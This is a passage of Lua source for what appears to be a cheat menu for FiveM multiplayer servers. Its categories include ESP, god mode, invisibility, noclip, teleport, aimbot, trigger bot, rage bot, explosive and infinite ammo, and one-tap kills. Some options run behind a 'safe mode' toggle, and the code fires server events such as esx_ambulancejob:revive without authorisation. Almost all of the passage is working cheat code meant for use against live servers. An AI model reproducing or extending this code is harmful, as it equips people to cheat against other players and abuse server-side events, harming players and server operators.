                                self:Draw3DText(coords.x, coords.y, pos_z, _id .. " | " .. self:CleanName(self:GetFunction("GetPlayerName")(src), true) .. " [" .. dict.math.ceil(dist) .. "M" .. "]" .. add, esp_talk_col[1], esp_talk_col[2], esp_talk_col[3])
   
                            else
   
                                self:Draw3DText(coords.x, coords.y, pos_z, _id .. " | " .. self:CleanName(self:GetFunction("GetPlayerName")(src), true) .. " [" .. dict.math.ceil(dist) .. "M" .. "]" .. add, col[1], col[2], col[3])
   
                            end
   
                        end
   
                    end
   
                end
   
            end
   
        end
   
    
   
        function AREF:DoBoxESP(src, ped)
   
            local r, g, b, a = 255, 255, 255, 255
   
    
   
            if self:GetFunction("NetworkIsPlayerTalking")(src) then
   
                r, g, b = esp_talk_col[1], esp_talk_col[2], esp_talk_col[3]
   
            end
   
    
   
            local model = self:GetFunction("GetEntityModel")(ped)
   
            local min, max = self:GetFunction("GetModelDimensions")(model)
   
            local top_front_right = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, max)
   
            local top_back_right = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, min.y, max.z))
   
            local bottom_front_right = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, max.y, min.z))
   
            local bottom_back_right = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, min.y, min.z))
   
            local top_front_left = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, max.y, max.z))
   
            local top_back_left = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, min.y, max.z))
   
            local bottom_front_left = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, max.y, min.z))
   
            local bottom_back_left = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, min)
   
            -- LINES
   
            -- RIGHT SIDE
   
            self:GetFunction("DrawLine")(top_front_right, top_back_right, r, g, b, a)
   
            self:GetFunction("DrawLine")(top_front_right, bottom_front_right, r, g, b, a)
   
            self:GetFunction("DrawLine")(bottom_front_right, bottom_back_right, r, g, b, a)
   
            self:GetFunction("DrawLine")(top_back_right, bottom_back_right, r, g, b, a)
   
            -- LEFT SIDE
   
            self:GetFunction("DrawLine")(top_front_left, top_back_left, r, g, b, a)
   
            self:GetFunction("DrawLine")(top_back_left, bottom_back_left, r, g, b, a)
   
            self:GetFunction("DrawLine")(top_front_left, bottom_front_left, r, g, b, a)
   
            self:GetFunction("DrawLine")(bottom_front_left, bottom_back_left, r, g, b, a)
   
            -- Connection
   
            self:GetFunction("DrawLine")(top_front_right, top_front_left, r, g, b, a)
   
            self:GetFunction("DrawLine")(top_back_right, top_back_left, r, g, b, a)
   
            self:GetFunction("DrawLine")(bottom_front_left, bottom_front_right, r, g, b, a)
   
            self:GetFunction("DrawLine")(bottom_back_left, bottom_back_right, r, g, b, a)
   
        end
   
    
   
        AREF:AddCategory("Self", function(self, x, y, w, h)
   
            local curY = 5
   
    
   
            if self.Painter:CheckBox("GOD MODE", self.Config.Player.God, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "god_enabled") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    self.Config.Player.God = not self.Config.Player.God
   
                    self.ConfigClass.Save(true)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("SEMI GOD MODE", self.Config.Player.SemiGod, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "semi_god_enabled") then
   
                self.Config.Player.SemiGod = not self.Config.Player.SemiGod
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("ANTI AFK", self.Config.Player.AntiAFK, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "anti_afk") then
   
                self.Config.Player.AntiAFK = not self.Config.Player.AntiAFK
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("INFINITE STAMINA", self.Config.Player.InfiniteStamina, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "infinite_stamina") then
   
                self.Config.Player.InfiniteStamina = not self.Config.Player.InfiniteStamina
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("NO RAGDOLL", self.Config.Player.NoRagdoll, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "no_ragdoll_enabled") then
   
                self.Config.Player.NoRagdoll = not self.Config.Player.NoRagdoll
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("INVISIBILITY", self.Config.Player.Invisibility, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "invisibility_enabled") then
   
                self.Config.Player.Invisibility = not self.Config.Player.Invisibility
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("REVEAL INVISIBLE PLAYERS", self.Config.Player.RevealInvisibles, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "reveal_invis_players") then
   
                self.Config.Player.RevealInvisibles = not self.Config.Player.RevealInvisibles
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("FAST RUN", self.Config.Player.FastRun, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "fast_af_runna_enabled") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    self.Config.Player.FastRun = not self.Config.Player.FastRun
   
                    self.ConfigClass.Save(true)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("SUPER JUMP", self.Config.Player.SuperJump, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "big_jump_enabled") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    self.Config.Player.SuperJump = not self.Config.Player.SuperJump
   
                    self.ConfigClass.Save(true)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("SUPER MAN", self.Config.Player.SuperMan, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "super_man_enabled") then
   
                self.Config.Player.SuperMan = not self.Config.Player.SuperMan
   
                self.ConfigClass.Save(true)
   
    
   
                if self.Config.Player.SuperMan then
   
                    self:AddNotification("INFO", "Press " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, "Space") .. " to go up / " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, "W") .. " to go forward.")
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("MAGIC CARPET", self.Config.Player.MagicCarpet, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "magic_carpet_enabled") then
   
                self.Config.Player.MagicCarpet = not self.Config.Player.MagicCarpet
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("FAKE DEAD", self.Config.Player.FakeDead, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "fake_dead") then
   
                self.Config.Player.FakeDead = not self.Config.Player.FakeDead
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("FORCE RADAR", self.Config.Player.ForceRadar, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "force_radar") then
   
                self.Config.Player.ForceRadar = not self.Config.Player.ForceRadar
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("THERMAL VISION", self.Config.Player.ThermalVision, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "thermal_vision") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    self.Config.Player.ThermalVision = not self.Config.Player.ThermalVision
   
                    self.ConfigClass.Save(true)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("NOCLIP", self.Config.Player.NoClip, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "togle_noclip") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    self.Config.Player.NoClip = not self.Config.Player.NoClip
   
                    self.ConfigClass.Save(true)
   
                end
   
            end
   
    
   
            curY = curY + 20
   
    
   
            if self.Painter:Button("HEAL" .. (self:GetBindText("heal_option", self.Painter:HoveringID("heal_option"))), x, y, 5, curY, nil, 20, 255, 255, 255, 255, "heal_option") or self:WasBindPressed("heal_option") then
   
                self:GetFunction("SetEntityHealth")(self.LocalPlayer, 200)
   
                self:GetFunction("ClearPedBloodDamage")(self.LocalPlayer)
   
                self:AddNotification("SUCCESS", "Healed.")
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("CLEAR BLOOD" .. (self:GetBindText("clear_blood_option", self.Painter:HoveringID("clear_blood_option"))), x, y, 5, curY, nil, 20, 255, 255, 255, 255, "clear_blood_option") or self:WasBindPressed("clear_blood_option") then
   
                self:GetFunction("ClearPedBloodDamage")(self.LocalPlayer)
   
                self:AddNotification("SUCCESS", "Blood removed.")
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("GIVE ARMOR" .. (self:GetBindText("armor_option", self.Painter:HoveringID("armor_option"))), x, y, 5, curY, nil, 20, 255, 255, 255, 255, "armor_option") or self:WasBindPressed("armor_option") then
   
                self:GetFunction("SetPedArmour")(self.LocalPlayer, 200)
   
                self:AddNotification("SUCCESS", "Armor given.")
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("SUICIDE" .. (self:GetBindText("suicide_option", self.Painter:HoveringID("suicide_option"))), x, y, 5, curY, nil, 20, 255, 255, 255, 255, "suicide_option") or self:WasBindPressed("armor_option") then
   
                self:GetFunction("SetEntityHealth")(self.LocalPlayer, 0)
   
                self:AddNotification("SUCCESS", "Killed.")
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.DynamicTriggers["esx_ambulancejob"] and self.DynamicTriggers["esx_ambulancejob"]["esx_ambulancejob:revive"] then
   
                if self.Painter:Button("REVIVE ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_revive") then
   
                    self:GetFunction("TriggerEvent")(self.DynamicTriggers["esx_ambulancejob"]["esx_ambulancejob:revive"])
   
                    self:AddNotification("SUCCESS", "Revived.")
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.Painter:Button("REVIVE", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "native_revive") then
   
                self:GetFunction("NetworkResurrectLocalPlayer")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0), self:GetFunction("GetEntityHeading")(self.LocalPlayer))
   
                self:AddNotification("SUCCESS", "Revived.")
   
            end
   
    
   
            curY = 5
   
            local _w = (self.Painter:GetTextWidth("DRIVE TO WAYPOINT (REQUIRES VEHICLE)", 4, 0.37)) + 26
   
    
   
            if self.Painter:CheckBox("DRIVE TO WAYPOINT (REQUIRES VEHICLE)", self.Config.Player.MoveToWaypoint, x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "wander_to_waypoint") then
   
                if self:IsWaypointValid() then
   
                    if not AREF:GetFunction("IsPedInAnyVehicle")(AREF.LocalPlayer) or AREF:GetFunction("GetPedInVehicleSeat")(AREF:GetFunction("GetVehiclePedIsIn")(AREF.LocalPlayer), -1) ~= AREF.LocalPlayer then
   
                        self:AddNotification("ERROR", "You must be in a vehicle to use this!")
   
                    else
   
                        self.Config.Player.MoveToWaypoint = not self.Config.Player.MoveToWaypoint
   
                        dict.moving_wp = false
   
                        self:GetFunction("ClearPedTasks")(self.LocalPlayer)
   
                    end
   
                else
   
                    self:AddNotification("ERROR", "You must have a waypoint set to use this!")
   
                end
   
            end
   
    
   
            curY = curY + 20
   
            local _w = (self.Painter:GetTextWidth("TELEPORT TO COORDS", 4, 0.37)) + 2
   
    
   
            if self.Painter:Button("TELEPORT TO COORDS", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "teleport_to_coords") then
   
                local x, y, z
   
                _x = self:GetTextInput("Enter X Coordinate.", 0, 15)
   
    
   
                if _x and dict.tonumber(_x) then
   
                    x = _x
   
                end
   
    
   
                if x then
   
                    local _y = self:GetTextInput("Enter Y Coordinate.", 0, 15)
   
    
   
                    if _y and dict.tonumber(_y) then
   
                        y = _y
   
                    end
   
                end
   
    
   
                if x and y then
   
                    local _z = self:GetTextInput("Enter Z Coordinate.", 0, 15)
   
    
   
                    if _z and dict.tonumber(_z) then
   
                        z = _z
   
                    end
   
                end
   
    
   
                if x and y and z then
   
                    x = dict.tonumber(x) + 0.0
   
                    y = dict.tonumber(y) + 0.0
   
                    z = dict.tonumber(z) + 0.0
   
                    self:GetFunction("SetEntityCoords")(self.LocalPlayer, x, y, z, false, false, false, false)
   
                    self:AddNotification("SUCCESS", "Teleported to coords.", 5000)
   
                else
   
                    self:AddNotification("INFO", "Cancelled.", 5000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
            local _w = (self.Painter:GetTextWidth("WAYPOINT TO COORDS", 4, 0.37)) + 2
   
    
   
            if self.Painter:Button("WAYPOINT TO COORDS", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "waypoint_to_coords") then
   
                local x, y
   
                _x = self:GetTextInput("Enter X Coordinate.", 0, 15)
   
    
   
                if _x and dict.tonumber(_x) then
   
                    x = _x
   
                end
   
    
   
                if x then
   
                    local _y = self:GetTextInput("Enter Y Coordinate.", 0, 15)
   
    
   
                    if _y and dict.tonumber(_y) then
   
                        y = _y
   
                    end
   
                end
   
    
   
                if x and y then
   
                    x = dict.tonumber(x) + 0.0
   
                    y = dict.tonumber(y) + 0.0
   
                    AREF:GetFunction("SetNewWaypoint")(x, y)
   
                    self:AddNotification("SUCCESS", "Waypoint set to coords.", 5000)
   
                else
   
                    self:AddNotification("INFO", "Cancelled.", 5000)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
            local _w = (self.Painter:GetTextWidth("TELEPORT TO WAYPOINT", 4, 0.37)) + 2
   
    
   
            if self.Painter:Button("TELEPORT TO WAYPOINT", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "teleport_to_waypoint") then
   
                self:TeleportToWaypoint()
   
            end
   
    
   
            if self.DynamicTriggers["esx_basicneeds"] and self.DynamicTriggers["esx_basicneeds"]["esx_basicneeds:healPlayer"] then
   
                curY = curY + 25
   
                local _w = (self.Painter:GetTextWidth("REFILL NEEDS ~g~ESX", 4, 0.37)) + 2
   
    
   
                if self.Painter:Button("REFILL NEEDS ~g~ESX", x, y, w - _w, curY, nil, 20, 255, 255, 255, 255, "refill_needs") then
   
                    AREF:GetFunction("TriggerEvent")(self.DynamicTriggers["esx_basicneeds"]["esx_basicneeds:healPlayer"])
   
                    AREF:AddNotification("SUCCESS", "Needs replenished!")
   
                end
   
            end
   
        end)
   
    
   
        function AREF:GetBindText(opt, clicking)
   
            local cfg = self.Config.Binds
   
            local text = ""
   
            if not cfg then return " [ERROR]" end
   
    
   
            if cfg[opt] == nil then
   
                text = " [UNBOUND]"
   
            else
   
                text = " [" .. cfg[opt] .. "]"
   
            end
   
    
   
            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["MOUSE2"]) and not dict.binding and clicking then
   
                dict.binding = opt
   
            end
   
    
   
            if dict.binding == opt then
   
                AREF:GetFunction("DisableControlAction")(0, AREF.Keys["ESC"], true)
   
                AREF:GetFunction("DisableControlAction")(1, AREF.Keys["ESC"], true)
   
    
   
                if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["ESC"]) then
   
                    dict.binding = nil
   
                    cfg[opt] = nil
   
                    self.ConfigClass.Save(true)
   
    
   
                    return " [UNBOUND]"
   
                else
   
                    for name, control in dict.pairs(self.Keys) do
   
                        if name ~= "BACKSPACE" and name ~= "MOUSE2" and name ~= "RIGHTCTRL" then
   
                            if self:GetFunction("IsDisabledControlPressed")(0, control) then
   
                                dict.binding = nil
   
                                dict.bind_time = GetGameTimer() + 300
   
                                cfg[opt] = name
   
                                self.ConfigClass.Save(true)
   
    
   
                                return " [" .. name .. "]"
   
                            end
   
                        end
   
                    end
   
                end
   
    
   
                return " [PRESS ANY KEY]"
   
            end
   
    
   
            return text
   
        end
   
    
   
        function AREF:WasBindPressed(opt)
   
            local cfg = self.Config.Binds
   
            if not cfg or not cfg[opt] then return end
   
            if dict.bind_time > self:GetFunction("GetGameTimer")() then return end
   
    
   
            if self:GetFunction("IsDisabledControlPressed")(0, self.Keys[cfg[opt]]) and not dict.binds[opt] then
   
                dict.binds[opt] = true
   
    
   
                return true
   
            elseif self:GetFunction("IsDisabledControlReleased")(0, self.Keys[cfg[opt]]) and dict.binds[opt] then
   
                dict.binds[opt] = false
   
            end
   
        end
   
    
   
        function AREF:DoBindListener()
   
            local cfg = self.Config.Binds
   
            if not cfg then return end
   
    
   
            for name, key in dict.pairs(cfg) do
   
                if dict.bind_handler[name] and self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys[key]) then
   
                    dict.bind_handler[name](AREF)
   
                end
   
            end
   
        end
   
    
   
        function AREF:AddBindListener(name, func)
   
            dict.bind_handler[name] = func
   
        end
   
    
   
        AREF:AddCategory("ESP", function(self, x, y)
   
            local curY = 5
   
    
   
            if self.Painter:CheckBox("ESP", self.Config.Player.ESP, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esp_enabled") then
   
                self.Config.Player.ESP = not self.Config.Player.ESP
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("NAMES", self.Config.Player.Names, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esp_names_enabled") then
   
                self.Config.Player.Names = not self.Config.Player.Names
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("INCLUDE WEAPON ON NAME", self.Config.Player.NameWeapons, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esp_name_weapons_enabled") then
   
                self.Config.Player.NameWeapons = not self.Config.Player.NameWeapons
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("BOX", self.Config.Player.Box, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esp_box_enabled") then
   
                self.Config.Player.Box = not self.Config.Player.Box
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("BLIPS", self.Config.Player.Blips, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esp_blips_enabled") then
   
                if self.Config.Player.Blips then
   
                    self:DoBlips(true)
   
                end
   
    
   
                self.Config.Player.Blips = not self.Config.Player.Blips
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("CROSSHAIR", self.Config.Player.CrossHair, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "crosshair_enabled") then
   
                self.Config.Player.CrossHair = not self.Config.Player.CrossHair
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 20
   
    
   
            if self.Painter:Button("ESP DRAW DISTANCE: " .. self.Config.Player.ESPDistance, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_aimbot_fov") then
   
                local new = self:GetTextInput("Enter ESP Draw Distance [5-50000]", self.Config.Player.ESPDistance, 7)
   
                if not dict.tonumber(new) then return self:AddNotification("ERROR", "Invalid distance.") end
   
                if dict.tonumber(new) < 5 or dict.tonumber(new) > 50000 then return self:AddNotification("ERROR", "Invalid distance.") end
   
                self.Config.Player.ESPDistance = dict.tonumber(new) + 0.0
   
                self:AddNotification("SUCCESS", "ESP Draw Distance changed to " .. self.Config.Player.ESPDistance .. ".")
   
                self.ConfigClass.Save(true)
   
            end
   
        end)
   
    
   
        AREF:AddCategory("Combat", function(self, x, y, w, h)
   
            local curY = 5
   
    
   
            if self.Painter:CheckBox("TRIGGER BOT", self.Config.Player.TriggerBot, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "trigger_bot_enabled") then
   
                self.Config.Player.TriggerBot = not self.Config.Player.TriggerBot
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("TRIGGER BOT NEEDS LOS", self.Config.Player.TriggerBotNeedsLOS, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "triggerbot_need_los_enabled") then
   
                self.Config.Player.TriggerBotNeedsLOS = not self.Config.Player.TriggerBotNeedsLOS
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("AIMBOT", self.Config.Player.Aimbot, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "aimbot_enabled") then
   
                self.Config.Player.Aimbot = not self.Config.Player.Aimbot
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("AIMBOT NEEDS LOS", self.Config.Player.AimbotNeedsLOS, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "aimbot_need_los_enabled") then
   
                self.Config.Player.AimbotNeedsLOS = not self.Config.Player.AimbotNeedsLOS
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("TP TO AIMBOT TARGET", self.Config.Player.TPAimbot, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "tpaimbot_enabled") then
   
                self.Config.Player.TPAimbot = not self.Config.Player.TPAimbot
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("TP BULLETS", self.Config.Player.TPBullets, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "tpbullets_enabled") then
   
                self.Config.Player.TPBullets = not self.Config.Player.TPBullets
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("DRAW AIMBOT FOV", self.Config.Player.AimbotDrawFOV, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "draw_aimbot_fov") then
   
                self.Config.Player.AimbotDrawFOV = not self.Config.Player.AimbotDrawFOV
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("ONLY TARGET PLAYERS", self.Config.Player.OnlyTargetPlayers, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "only_target_players") then
   
                self.Config.Player.OnlyTargetPlayers = not self.Config.Player.OnlyTargetPlayers
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("TRIGGER BOT TARGET VEHICLES", self.Config.Player.TargetInsideVehicles, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "target_inside_vehicles") then
   
                self.Config.Player.TargetInsideVehicles = not self.Config.Player.TargetInsideVehicles
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("INFINITE COMBAT ROLL", self.Config.Player.InfiniteCombatRoll, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "infinite_combat_roll") then
   
                self.Config.Player.InfiniteCombatRoll = not self.Config.Player.InfiniteCombatRoll
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("~r~RAGE ~s~BOT", self.Config.Player.RageBot, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "rage_bot") then
   
                self.Config.Player.RageBot = not self.Config.Player.RageBot
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("NO BULLET DROP", self.Config.Player.NoDrop, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "no_bullet_drop") then
   
                self.Config.Player.NoDrop = not self.Config.Player.NoDrop
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("NO RELOAD", self.Config.Player.NoReload, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "no_reload") then
   
                self.Config.Player.NoReload = not self.Config.Player.NoReload
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("INFINITE AMMO", self.Config.Player.InfiniteAmmo, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "infinite_ammo") then
   
                self.Config.Player.InfiniteAmmo = not self.Config.Player.InfiniteAmmo
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("RAPID FIRE", self.Config.Player.RapidFire, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "rapid_fire") then
   
                self.Config.Player.RapidFire = not self.Config.Player.RapidFire
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("EXPLOSIVE AMMO", self.Config.Player.ExplosiveAmmo, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "explosive_ammo") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    self.Config.Player.ExplosiveAmmo = not self.Config.Player.ExplosiveAmmo
   
                    self.ConfigClass.Save(true)
   
                end
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:CheckBox("ONE TAP", self.Config.Player.OneTap, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "one_tap_enabled") then
   
                if self.Config.SafeMode then
   
                    self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                else
   
                    self.Config.Player.OneTap = not self.Config.Player.OneTap
   
                    self.ConfigClass.Save(true)
   
                end
   
            end
   
    
   
            curY = curY + 20
   
    
   
            if self.Painter:ListChoice("AIMBOT BONE: ", dict.aimbot_bones, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "aimbot_bone", self:IndexOf(dict.aimbot_bones, dict.tostring(dict.aimbot_bones[self.Config.Player.AimbotBone]))) then
   
                self.Config.Player.AimbotBone = list_choices["aimbot_bone"].selected
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("AIMBOT FOV: " .. self.Config.Player.AimbotFOV, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_aimbot_fov") then
   
                local new = self:GetTextInput("Enter Aimbot FOV [5-500]", self.Config.Player.AimbotFOV, 7)
   
                if not dict.tonumber(new) then return self:AddNotification("ERROR", "Invalid FOV.") end
   
                if dict.tonumber(new) < 5 or dict.tonumber(new) > 500 then return self:AddNotification("ERROR", "Invalid FOV.") end
   
                self.Config.Player.AimbotFOV = dict.tonumber(new) + 0.0
   
                self:AddNotification("SUCCESS", "Aimbot FOV changed to " .. self.Config.Player.AimbotFOV .. ".")
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("TRIGGER BOT DISTANCE: " .. self.Config.Player.TriggerBotDistance, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_trigger_bot_distance") then
   
                local new = self:GetTextInput("Enter Trigger Bot Distance [10-10000]", self.Config.Player.TriggerBotDistance, 7)
   
                if not dict.tonumber(new) then return self:AddNotification("ERROR", "Invalid distance.") end
   
                if dict.tonumber(new) < 10 or dict.tonumber(new) > 10000 then return self:AddNotification("ERROR", "Invalid distance.") end
   
                self.Config.Player.TriggerBotDistance = dict.tonumber(new) + 0.0
   
                self:AddNotification("SUCCESS", "Trigger Bot distance changed to " .. self.Config.Player.TriggerBotDistance .. ".")
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = curY + 25
   
    
   
            if self.Painter:Button("TP AIMBOT THRESHOLD: " .. self.Config.Player.TPAimbotThreshold, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_tp_aimbot_threshold") then
   
                local new = self:GetTextInput("Enter TP Aimbot Threshold [10-1000]", self.Config.Player.TPAimbotThreshold, 7)
   
                if not dict.tonumber(new) then return self:AddNotification("ERROR", "Invalid distance.") end
   
                if dict.tonumber(new) < 10 or dict.tonumber(new) > 1000 then return self:AddNotification("ERROR", "Invalid distance.") end
   
                self.Config.Player.TPAimbotThreshold = dict.tonumber(new) + 0.0
   
                self:AddNotification("SUCCESS", "TP Aimbot threshold changed to " .. self.Config.Player.TPAimbotThreshold .. ".")
   
                self.ConfigClass.Save(true)
   
            end
   
    
   
            curY = 5
   
            local _w = (self.Painter:GetTextWidth("TP AIMBOT DISTANCE: " .. self.Config.Player.TPAimbotDistance, 4, 0.35))
   
    
   
            if self.Painter:Button("TP AIMBOT DISTANCE: " .. self.Config.Player.TPAimbotDistance, x, y, w - _w - 10, curY, nil, 20, 255, 255, 255, 255, "set_tp_aimbot_distance") then
   
                local new = self:GetTextInput("Enter TP Aimbot Distance [0-10]", self.Config.Player.TPAimbotDistance, 7)
   
                if not dict.tonumber(new) then return self:AddNotification("ERROR", "Invalid distance.") end
   
                if dict.tonumber(new) < 0 or dict.tonumber(new) > 10 then return self:AddNotification("ERROR", "Invalid distance.") end
   
                self.Config.Player.TPAimbotDistance = dict.tonumber(new) + 0.0
   
                self:AddNotification("SUCCESS", "TP Aimbot distance changed to " .. self.Config.Player.TPAimbotDistance .. ".")
   
                self.ConfigClass.Save(true)
   
            end
   
        end)
   
    
   
        -- curY = curY + 25
   
